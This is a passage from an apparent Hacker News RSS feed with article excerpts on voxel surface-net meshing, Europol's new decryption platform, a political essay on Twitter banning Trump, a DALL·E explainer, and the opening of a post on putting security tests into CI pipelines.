https://0fps.files.wordpress.com/2012/07/primalcomplex.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>This is pretty nice because it is easy to find intersection points along edges. &nbsp;Of course, there is some topological ambiguity in this construction.&nbsp; For non-simplicial cells crossing the boundary it is not always clear how you would glue the cells together:</p>
<p><img loading="lazy" data-attachment-id="537" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/primalcell/" data-orig-file="https://0fps.files.wordpress.com/2012/07/primalcell.png" data-orig-size="929,198" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="primalcell" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=640" title="primalcell" alt="" src="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300&amp;h=63" height="63" width="300" srcset="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=296&amp;h=63 296w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=591&amp;h=126 591w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=150&amp;h=32 150w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300&amp;h=64 300w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>As we have seen, these ambiguities lead to exponentially many special cases, and are generally a huge pain to deal with.</p>
<h3>Dual Methods</h3>
<p>Dual methods on the other hand use a very different topology for the surface mesh.&nbsp; Like primal methods, they only consider the cells which intersect the boundary, but the rule they use to construct surface cells is very different:</p>
<ul>
<li>For every edge crossing the boundary, create an (n-1) cell.&nbsp; (Face in 3D)</li>
<li>For every face crossing the boundary, create an (n-2) cell. (Edge in 3D)</li>
<li>…</li>
<li>For every d-dimensional cell, create an (n-d) cell.</li>
<li>…</li>
<li>For every n-cell, create a vertex.</li>
</ul>
<p>This creates a much simpler topological structure:</p>
<p><img loading="lazy" data-attachment-id="538" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/dualcomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png" data-orig-size="537,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="dualcomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=537" title="dualcomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300&amp;h=234" height="234" width="300" srcset="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300&amp;h=234 300w, https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=150&amp;h=117 150w, https://0fps.files.wordpress.com/2012/07/dualcomplex.png 537w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>The nice thing about this construction is that unlike primal methods, the topology of the dual isosurface mesh is completely determined by the sample complex (so there are no ambiguities).&nbsp; The disadvantage is that you may sometimes get non-manifold vertices:</p>
<p><img loading="lazy" data-attachment-id="465" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/dualmesh/" data-orig-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png" data-orig-size="589,245" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="dualmesh" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=589" title="dualmesh" alt="" src="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=300&amp;h=124" height="124" width="300" srcset="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=298&amp;h=124 298w, https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=150&amp;h=62 150w, https://0fps.files.wordpress.com/2012/07/dualmesh.png 589w" sizes="(max-width: 300px) 100vw, 300px"></p>
<h2>Make Your Own Dual Scheme</h2>
<p>To create your own dual method, you just have to specify two things:</p>
<ol>
<li>A sample complex.</li>
<li>And a rule to assign vertices to every n-cell intersecting the boundary.</li>
</ol>
<p>The second item is the tricky part, and much of the research into dual methods has focused on exploring the possibilities. &nbsp;It is interesting to note that this is the opposite of primal methods, where finding vertices was pretty easy, but gluing them together consistently turned out to be quite hard.</p>
<h3>Surface Nets</h3>
<p>Here’s a neat puzzle: what happens if we apply the dual recipe to a regular, cubical grid&nbsp;(like we did in marching cubes)? &nbsp;Well, it turns out that you get the same boxy, cubical meshes that you’d make in a Minecraft game (topologically speaking)!</p>
<p><a href="https://0fps.files.wordpress.com/2012/07/exampledualmesh.png"><img title="exampledualmesh" alt="" src="https://0fps.files.wordpress.com/2012/07/exampledualmesh.png?w=150&amp;h=145" height="145" width="150"></a><a href="https://0fps.files.wordpress.com/2012/07/spheresmoothed.png"><img title="spheresmoothed" alt="" src="https://0fps.files.wordpress.com/2012/07/spheresmoothed.png?w=150&amp;h=138" height="138" width="150"></a></p>
<p>Left: A dual mesh with vertex positions snapped to integer coordinates.&nbsp; Right: A dual mesh with smoothed vertex positions.</p>
<p>So if you know how to <a href="https://0fps.wordpress.com/2012/06/30/meshing-in-a-minecraft-game/">generate Minecraft meshes</a>, then you already know how to make smooth shapes! &nbsp;All you have to do is squish your vertices down onto the isosurface somehow. &nbsp;How cool is that?</p>
<p>This technique is called “surface nets” (remember when we mentioned them before?) &nbsp;Of course the trick is to figure out where you place the vertices. &nbsp;In Gibson’s original paper, she formulated the process of vertex …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/">https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/</a></em></p>]]>
            </description>
            <link>https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690189</guid>
            <pubDate>Fri, 08 Jan 2021 20:43:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Europol launched an innovative decryption platform]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25690151">thread link</a>) | @tmkbry
<br/>
January 8, 2021 | https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This week Europol launched an innovative decryption platform, developed in close cooperation with the <a href="https://ec.europa.eu/info/departments/joint-research-centre_en" target="_blank">European Commission's Joint Research Centre</a>. It will significantly increase Europol’s capability to decrypt information lawfully obtained in criminal investigations.</p>
<p>The launch of the new decryption platform marks a milestone in the fight against organised crime and terrorism in Europe. In full respect of fundamental rights and without limiting or weakening encryption, this initiative will be available to national law enforcement authorities of all Member States to help keep societies and citizens safe and secure. A virtual inauguration ceremony brought together senior representatives from Europol, the <a href="https://www.europarl.europa.eu/portal/en" target="_blank">European Parliament</a>, the <a href="https://www.consilium.europa.eu/en/" target="_blank">Council of the EU</a> and the <a href="https://ec.europa.eu/info/index_en" target="_blank">Commission</a>.</p>
<p>The event highlighted strong organisational cooperation within the EU and the considerable potential in innovation, research and development of the EU innovation hub for internal security.</p>
<p><strong>Ylva Johansson, EU Commissioner for Home Affairs</strong> said:</p>
<blockquote><p>This decryption platform will help police to investigate terrorism and serious and organised criminality. It will be important in the fight against online child sexual abuse. National police forces can now send lawfully obtained evidence to Europol for decryption.</p>
</blockquote>
<p>Addressing the event, <strong>Europol’s Executive Director Catherine De Bolle</strong> said:</p>
<blockquote><p>Today marks the end of a three-year-long journey. We have made a significant step forward in combating the criminal abuse of encryption with the aim of keeping our society and citizens safe while fully respecting fundamental rights. The new Europol Decryption Platform, funded by the European Commission, will allow us to further enhance our support for Member State investigations. This is the result of successful inter-organisational collaboration within the EU and shows the potential for further joint work and support for the EU innovation hub for internal security. I would like to express my gratitude to the Joint Research Centre for their strong partnership in this project.</p>
</blockquote>
<p>
Europol’s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3)</a> will operate the platform and leverage its in-house expertise in providing the most effective support to national Member State investigations.<br>
EC3 is dedicated to strengthening the law enforcement response to cybercrime in the EU and focuses on cybercrime committed by organised crime groups, which generate large profits (online fraud), seriously harm victims (online child sexual exploitation) or impact critical infrastructure and information systems in the EU, including through cyber-attacks.</p>
<hr><p>Headquartered in The Hague, the Netherlands, Europol supports the 27 EU Member States in their fight against terrorism, cybercrime and other serious and organised forms of crime. We also work with many non-EU partner states and international organisations. From its various threat assessments to its intelligence-gathering and operational activities, Europol has the tools and resources it needs to do its part in making Europe safer.</p>
</div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690151</guid>
            <pubDate>Fri, 08 Jan 2021 20:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Censorship: Centralized Social Partitions Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25689548">thread link</a>) | @generativist
<br/>
January 8, 2021 | https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful | <a href="https://web.archive.org/web/*/https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <figure><img src="https://p.falsifiable.page/zQmXh5PW9Q4DPPgcSpQZyX6MhBYUadFWQuZ4mtRN1E1m9Q7" alt=""></figure><h3 id="what-would-you-do">What Would You Do?</h3><p>Last November, I asked my followers a question,</p>
<div><blockquote><div lang="en" dir="ltr"><p>thought experiment: twitter has a dialog box that you have to fill out one day next year. if you press yes, trump and every interaction with him is irrevocably filtered from your feed. no, and they aren’t. </p><p>what do you press?</p></div>— (wannabe) Ƀreaker of (the Bad) Loops (@generativist) <a href="https://twitter.com/generativist/status/1326739583699095553?ref_src=twsrc%5Etfw">November 12, 2020</a></blockquote></div><p>Most answered in the affirmative. I would answer in the same way. No interaction with him – whether in favor or against – has ever been worth my time.<label for="sn-0"></label><span>I’ve never followed him but, FWIW, I have reply-guy’d in anger</span></p>
<p>That isn’t to say I want to simply ignore all references to him, period. That would be foolish. Not only was he the President of the United States, but he was a despotic megalomaniac. America is the country I call home, so it very much matters to me. Yelling “just ignore him” isn’t even a good solution for when two siblings fight in the back seat of your wood-paneled station wagon.</p>

<p>Yet, <strong>I am willing to rely on trusted mediation</strong>.</p>

<p>And, I have!</p>

<p>You probably have, too.</p>

<p>To a large degree, that is the generalized power and promise of social media.<label for="sn-1"></label><span>Of course, social media is not just also but is mostly an expressive medium. Thinking about it through a purely instrumental lens is an exercise of futility, at best.</span> “The real environment is altogether too big, too complex, and too fleeting for direct acquaintance.” We <em>require</em> indirect sources of information. Historically, such sources were bound by space and time. Technological progression slowly liberated us from both. Now, social media grants us the ability to select our intermediaries from what approaches the world’s entire population.<label for="sn-2"></label><span>The revolution wasn’t televised – it was topological. Or, something like that.</span> This power is truly incredible. We exist in a space our ancestors could only imagine through the magic of fiction.</p>

<p>However, with great power comes great potential fuckery.</p>
<p>Like ‘propaganda’, ‘manipulation’ currently has negative connotation. The more comfortable and consequently common word to reach for is “influence.” It amounts to the same thing though. When we say someone “influences” us, we mean we’ve escalated their permissions over our beliefs in some critical way. And as we extend trust, we constrict incredulity.</p>
<p>Ideally, this relationship isn’t paired with passivity. When someone’s expressions fail to match either our direct experience or our careful interrogation (or both), our trust in them <em>should</em> degrade. And, with degraded trust, our skepticism of what they have to say grows accordingly.</p>

<p><strong>This is an adaptive process.</strong> Human sociality affords distributed search and specialization. The titanic polymath who could deeply understand the entirety of human knowledge is a romanticized relic of a long departed past. Having the world’s information at your fingertips means that you can <em>enter</em> a mind-boggling large amount of the terrain at any given time. But, <em>you can’t explore it all</em>. Time still binds us individually. We need we.</p>
<p>This process becomes mal-adaptive in proportion to the degree that trust becomes a function of something <em>other</em> than our accumulated evaluations of what someone says.<label for="sn-3"></label><span>In political science literature, <a href="https://en.wikipedia.org/wiki/Negative_partisanship">negative partisanship</a> refers to one symptomatic manifestation of the syndrome.</span> As it does, the harms associated with the negative connotations of manipulation and propaganda manifest. We find both our emotions and beliefs manipulated in ways <em>at odds with what we would discover independently, given sufficient time and information.</em></p>

<p><a href="https://generativist.falsifiable.com/metaverse/dunbars-number-is-quadratic">On social media, this happens with fluid ease</a>.</p>

<p><a href="https://dispatches.artifexdeus.com/donald-trump-is-hari-seldon-75bd789637d9">Trump leverages this form of attack relentlessly</a>. Enjoying (pathological) agenda setting power in both traditional media and as social media supernode,<label for="sn-4"></label><span>I believe <a href="https://generativist.falsifiable.com/metaverse/the-real-supernode-problem">supernodes on social media represent a problem in their own right</a>.</span> his ability and inclination to induce mal-adaptive contagion is unrivaled in recent times.</p>
<p>For these reasons, I think Facebook and Twitter banning Trump is, at face-value, reasonable. <a href="https://medium.com/@generativist/dear-jack-ban-donald-trump-7c57e86c8ed9#.ee2bsxwu9">I also thought it was the correct thing to do in 2016</a>. It’s an emergency scram button to shut down our the hypercritical reactor. Banning Trump broadly facilitates the discovery and expression of beliefs for all participants – online and elsewhere – save Trump. <strong>However, I don’t think it’s reasonable to pretend doing so represents a <em>good</em> solution.</strong> Instead, it’s merely the best one constrained to those that are easy and without admitting the possibility of better architectures.</p>
<h2 id="a-decent-proposal">A Decent Proposal</h2><p>Trump’s grip on culture and social media strangles both. But only the latter affords straight-forward technological interventions. Individual action has proven insufficient. There are a myriad of incentives (many of which are also pathological) that prevent people from using mutes and blocks. It is a collective action problem for which the collective has no binding means of consensus formation. The question posed by my tweet allows me to propose a minimally viable one: <em>ask the users</em>.</p>

<p>To be more specific, consider a candidate specification:</p>

<blockquote>
<p>On <code>promptDate</code>, all users will be presented with a modal dialog asking them to make a <code>YES</code>/<code>NO</code> decision. If they answer <code>YES</code>, neither <code>@realdonaldtrump</code> nor any interaction with him gets placed in their feed. That is, twitter filters all of his tweets and replies from both your timeline feed and all user feeds (from the perspective of your account). If you answer <code>NO</code>, your subjective view does not change. The aggregate vote tallies are visible on each day up until <code>bindingDate</code>. You may change your vote any time until then. Afterwards, votes and resulting infrastructure changes are commited <em>and irrevocable for each particular account</em>.</p>
</blockquote>

<p>I think this solution would facilitate healthy conversation with effects that reverberated offline. Moreover, it does so in a way that expands the agency of twitter users, rather than unilateral restricts it.<label for="sn-5"></label><span>I’m only interested in twitter because I think it’s a far more important medium and because I think facebook and King Zuck are irredeemable.</span> However, neither hypothetical benefit motivates my reasoning.</p>
<h2 id="platform-balkanization">Platform Balkanization</h2><p>I’ve demanded the digital pound of metaphorical flesh many times. In the case of Donald Trump, I’d revel in it. That is to say, I understand viscerally the impulse towards participant expulsion, generally and in this particular.<label for="sn-6"></label><span>I no longer do, for a variety of reasons, many of which are in this post, but also <a href="https://twitter.com/generativist/status/1254475955478790144">at least in part because of interactions with twitter friends @sonyasupposedly and @aelkus</a>.</span> But Banning Trump is unique because it is possible that his move to, say Parler, <em>could</em> drive a mass exodus.<label for="sn-7"></label><span>I make no claims as to the odds.</span></p>

<p>The first order effects of such a potential outcome are delightful for many parties, including me. Twitter (and facebook), gets to discharge an asset-that-has-predictably-curdled-into-a-liability. There is a reason neither has acted until recently. And, Gab and Parler aren’t even competitors – they’re White knights. More importantly, those subject to durable social media abuses get genuine harm reduction. Dismissing that is just a smug variant on “fuck your feelings.”</p>

<p>But, reduction associated with displacing the shittiest participants of social media onto a new medium <em>could be an ephemeral mirage.</em> <strong>Out of sight, out of mind, <em>and into commercialized hate breeder reactors</em> may not be a good strategy</strong>. Thus, the risk I am more interested in at least injecting into the current frenetic conversation is platform balkanization.</p>
<p>Broadly, there are two hypotheses about what happens when these users get isolated on a new network partition (here, in the form of a different platform),</p>

<ol>
<li><p><strong>Smothered fire</strong>: The echo-chamber becomes a circle jerk; participants get bored for lack of targets; raids on larger networks will occur sporadically but they can’t trigger the same dynamics; the medium fizzles out.</p></li>

<li><p><strong>Coal-seam fire</strong>: The echo-chamber splits consensus reality in an enduring way; people with similar corrosive beliefs form an even more cohesive orthodoxy; the distance between them and people outside the partition grows; in-group trust pins on maximal, granting uncritical reception of escalatingly radical beliefs.</p></li>
</ol>

<p>The smothered fire scenario is seductive. And, it may happen! But, increasingly, the coal seam fire seems…if not more likely, than at least the one that deserves way more focused consideration. 2016 and everything after wasn’t a wildly unlikely bad sample path. It was a continuation. We hid some things from ourselves before then; we want to do so yet again. While criticisms of social media are extremely valid – there is an impressive inventory of problems – blame assignment then and now has some convenience borne of desperation. But, there is at least one critical difference: Public passions and fiduciary responsibilities are currently aligned.</p>
<h2 id="freedom-of-speech-vs-reach">Freedom of Speech vs Reach</h2><p>Censorship is easy to defend against at low temperatures. It’s our cultural’s default stance. But at high social temperatures where norms diffusely lose stability, so does the strength of our convictions. It becomes easier to withdraw principled support when principles no longer broadly bind.</p>

<p>Things are very hot now.</p>

<p>I have neither the desire nor inclination to defend Donald Trump on free speech grounds. I think people who do so are fools – those who do so in deference to a principle and with precisely zero context, doubly so.</p>

<p>I also think people who pretend it isn’t censorship – that it is a question of reach, rather than speech – miss the point in similar ways. Yes, Twitter is a private company. It has every legal right<label for="sn-8"></label><span>Section 230 questions aside.</span> to ban anyone, and especially someone as malignant as Trump. But, I treat it as something more important than that – I treat it as a public commons in hyper-space. Celebrating the corporate entities ability to unilateral tear up a large portion of the social graph makes the contrast obvious. In it, I find myself in a curious position: imploring Lord Jack to consider better …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful</a></em></p>]]>
            </description>
            <link>https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689548</guid>
            <pubDate>Fri, 08 Jan 2021 19:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Dalle Works in Under 5 Minutes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688913">thread link</a>) | @dalequark
<br/>
January 8, 2021 | https://daleonai.com/dalle-5-mins | <a href="https://web.archive.org/web/*/https://daleonai.com/dalle-5-mins">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>It seems like every few months, someone publishes a machine learning paper or demo that makes my jaw drop. This month, it’s OpenAI’s new image-generating model, <a href="https://openai.com/blog/dall-e/">DALL·E</a>.</p>

<p>This behemoth 12-billion-parameter neural network takes a text caption (i.e. “an armchair in the shape of an avocado”) and generates images to match it:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.37.37-pm.png" alt="Generated images of avocado chairs" title="Generated images of avocado chairs"></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>I think its pictures are pretty inspiring (I’d buy one of those avocado chairs), but what’s even more impressive is DALL·E’s ability to understand and render concepts of space, time, and even logic (more on that in a second).</p>

<p>In this post, I’ll give you a quick overview of what DALL·E can do, how it works, how it fits in with recent trends in ML, and why it’s significant. Away we go!</p>

<h2 id="what-is-dalle-and-what-can-it-do">What is DALL·E and what can it do?</h2>

<p>In July, DALL·E’s creator, the company OpenAI, released a similarly huge model called GPT-3 that wowed the world with <a href="https://daleonai.com/gpt3-explained-fast">its ability to generate human-like text</a>, including Op Eds, poems, sonnets, and even computer code. DALL·E is a natural extension of GPT-3 that parses text prompts and then responds not with words but in pictures. In one example from OpenAI’s blog, for example, the model renders images from the prompt “a living room with two white armchairs and a painting of the collosseum. the painting is mounted above a modern fireplace”:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-2.39.07-pm.png" alt="DALLE generated images" title="DALLE generated images"></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>Pretty slick, right? You can probably already see how this might be useful for designers. Notice that DALL·E can generate a large set of images from a prompt. The pictures are then ranked by a second OpenAI model, called <a href="https://openai.com/blog/clip/">CLIP</a>, that tries to determine which pictures match best.</p>

<h2 id="how-was-dalle-built">How was DALL·E built?</h2>

<p>Unfortunately, we don’t have a ton of details on this yet because OpenAI has yet to publish a full paper. But at its core, DALL·E uses the same new neural network architecture that’s responsible for tons of recent advances in ML: the <a href="https://arxiv.org/abs/1706.03762">Transformer</a>. Transformers, discovered in 2017, are an easy-to-parallelize type of neural network that can be scaled up and trained on huge datasets. They’ve been particularly revolutionary in natural language processing (they’re the basis of models like BERT, T5, GPT-3, and others), improving the quality of <a href="https://blog.google/products/search/search-language-understanding-bert/">Google Search</a> results, translation, and even in <a href="https://daleonai.com/how-alphafold-works">predicting the structures of proteins</a>.</p>

<p>Most of these big language models are trained on enormous text datasets (like all of Wikipedia or <a href="https://commoncrawl.org/"></a><a href="https://commoncrawl.org/">crawls of the web</a>). What makes DALL·E unique, though, is that it was trained on sequences that were a combination of words and pixels. We don’t yet know what the dataset was (it probably contained images and captions), but I can guarantee you it was probably massive.</p>

<h2 id="how-smart-is-dalle">How “smart” is DALL·E?</h2>

<p>While these results are impressive, whenever we train a model on a huge dataset, the skeptical machine learning engineer is right to ask whether the results are merely high-quality because they’ve been copied or memorized from the source material.</p>

<p>To prove DALL·E isn’t just regurgitating images, the OpenAI authors forced it to render some pretty unusual prompts:</p>

<p>“a professional high quality illustration of a giraffe turtle chimera.”</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.39.04-pm.png" alt=""></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>“a snail made of a harp.”</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.39.12-pm.png" alt=""></p>

<p><em>From https://openai.com/blog/dall-e/.</em></p>

<p>It’s hard to imagine the model came across many giraffe-turtle hybrids in its training data set, making the results more impressive.</p>

<p>What’s more, these weird prompts hint at something even more fascinating about DALL·E: its ability to perform “zero-shot visual reasoning.”</p>

<h2 id="zero-shot-visual-reasoning">Zero-Shot Visual Reasoning</h2>

<p>Typically in machine learning, we train models by giving them thousands or millions of examples of tasks we want them to preform and hope they pick up on the pattern.</p>

<p>To train a model that identifies dog breeds, for example, we might show a neural network thousands of pictures of dogs labeled by breed and then test its ability to tag new pictures of dogs. It’s a task with limited scope that seems almost quaint compared to OpenAI’s latest feats.</p>

<p>Zero-shot learning, on the other hand, is the ability of models to perform tasks that they weren’t specifically trained to do. For example, DALL·E was trained to generate images from captions. But with the right text prompt, it can also transform images into sketches:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.41.02-pm.png" alt=""></p>

<p><em>Results from the prompt, “the exact same cat on the top as a sketch on the bottom”. From https://openai.com/blog/dall-e/</em></p>

<p>DALL·E can also render custom text on street signs:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-2.51.53-pm.png" alt=""></p>

<p>Results from the prompt <em>“a store front that has the word ‘openai’ written on it’”. From https://openai.com/blog/dall-e/.</em></p>

<p>In this way, DALL·E can act almost like a Photoshop filter, even though it wasn’t specifically designed to behave this way.</p>

<p>The model even shows an “understanding” of visual concepts (i.e. “macroscopic” or “cross-section” pictures), places (i.e. “a photo of the food of china”), and time (“a photo of alamo square, san francisco, from a street at night”; “a photo of a phone from the 20s”). For example, here’s what it spit out in response to the prompt “a photo of the food of china”:</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-06-at-1.42.22-pm.png" alt=""></p>

<p><em>“a photo of the food of china” from https://openai.com/blog/dall-e/.</em></p>

<p>In other words, DALL·E can do more than just paint a pretty picture for a caption; it can also, in a sense, answer questions visually.</p>

<p>To test DALL·E’s visual reasoning ability, the authors had it take a visual IQ test. In the examples below, the model had to complete the lower right corner of the grid, following the test’s hidden pattern.</p>

<p><img src="https://daleonai.com/images/screen-shot-2021-01-07-at-1.22.26-pm.png" alt=""></p>

<p><em>A screenshot of the visual IQ test OpenAI used to test DALL·E</em> <em>from https://openai.com/blog/dall-e/.</em></p>

<p>“DALL·E is often able to solve matrices that involve continuing simple patterns or basic geometric reasoning,” write the authors, but it did better at some problems than others. When the puzzles’s colors were inverted, DALL·E did worse–“suggesting its capabilities may be brittle in unexpected ways.”</p>

<h2 id="what-does-it-mean">What does it mean?</h2>

<p>What strikes me the most about DALL·E is its ability to perform surprisingly well on so many different tasks, ones the authors didn’t even anticipate:</p>

<p>“We find that DALL·E […] is able to perform several kinds of image-to-image translation tasks when prompted in the right&nbsp;way.</p>

<p>We did not anticipate that this capability would emerge, and made no modifications to the neural network or training procedure to encourage it.”</p>

<p>It’s amazing, but not wholly unexpected; DALL·E and GPT-3 are two examples of a greater theme in deep learning: that extraordinarily big neural networks trained on unlabeled internet data (an example of “self-supervised learning”) can be highly versatile, able to do lots of things weren’t specifically designed for.</p>

<p>Of course, don’t mistake this for general intelligence. It’s <a href="https://lacker.io/ai/2020/07/06/giving-gpt-3-a-turing-test.html">not hard</a> to trick these types of models into looking pretty dumb. We’ll know more when they’re openly accessible and we can start playing around with them. But that doesn’t mean I can’t be excited in the meantime.</p>

    </div></div>]]>
            </description>
            <link>https://daleonai.com/dalle-5-mins</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688913</guid>
            <pubDate>Fri, 08 Jan 2021 19:20:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four levels of maturity that bridge the AppSec / engineering divide]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25688143">thread link</a>) | @pabloest
<br/>
January 8, 2021 | https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2021/four-levels-of-maturity-that-bridge-the-app-sec-engineering-divide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p><em>This is a guest post authored by <a href="https://jacobian.org/" target="_blank" rel="noopener">Jacob Kaplan-Moss</a>, co-creator of Django.</em></p>
<h3>Introduction</h3>
<p>I’ve spent a good deal of my career with my feet in two different worlds. I came up as a web developer and helped create a popular web framework (Django). And I’ve spent a sizable chunk of my career working in information security.
Unfortunately, I’ve seen these two roles clash far too often. Engineering often sees Security as standing in the way of delivery, or as creating meaningless busywork. Security thinks Engineering is irresponsible, willing to ship broken or vulnerable code.</p>
<p>I’ve spent more than a decade trying to bridge this gap. There’s no silver bullet. But, over and over, I’ve seen one practice be quite effective: automated security tests — and particularly integrating security checks and tests into an existing CI pipeline.</p>
<h3>Bringing Security along on the CI/CD journey</h3>
<p>Engineers have largely embraced CI as a critical part of quality assurance, and that a robust test suite that runs on every commit is a huge enabler of velocity. We can be bold about making changes, knowing that the test suite will catch us if we’ve messed up. A mature CI/CD pipeline is a reliable litmus test for good software.</p>
<p>Historically, though, Security has been left out of this CI/CD journey. We’ve relied on manual security assessments; hands-on exercises like threat modelling and threat hunting; and bespoke penetration tests. These are important activities that will always have a place in a mature product security lifecycle, but they increasingly are difficult to integrate into an agile delivery model that relies on incremental changes and automated tests. Much of the friction between modern engineering and security teams can come down to this impedance mismatch.</p>
<p>So, to get Security and Engineering playing well together, one massively useful tool is getting security work integrated into continuous delivery. When done right, Security and Engineering work together to produce automated checks that cover security issues in the same test suite that’s already in CI. This maintains delivery cadence, gives confidence about the security of the product, and — most importantly — gives a place where Security and Engineering collaborate, rather than conflict, to produce secure code.</p>
<p>How does this look in practice? Each organization is different, but there’s a typical progression of maturity that Security and Engineering orgs go through as they build a continuous integration and automation pipeline:</p>
<ul>
<li>Level 1: Security finds problems; Engineering fixes them</li>
<li>Level 2: Security and Engineering collaborate to produce test cases and remediations</li>
<li>Level 3: After the issue is fixed, Security and Engineering collaborate to find systemic fixes and develop checks</li>
<li>Level 4: Security and Engineering now also proactively look for new classes of issues and create systemic checks before an actual problem occurs</li>
</ul>
<p>For the rest of this post, I’ll walk through each of these phases with a specific example about a team that systemically fixed an issue with logging sensitive tokens.</p>
<h3>Level 1: Security finds problems; Engineering fixes them</h3>
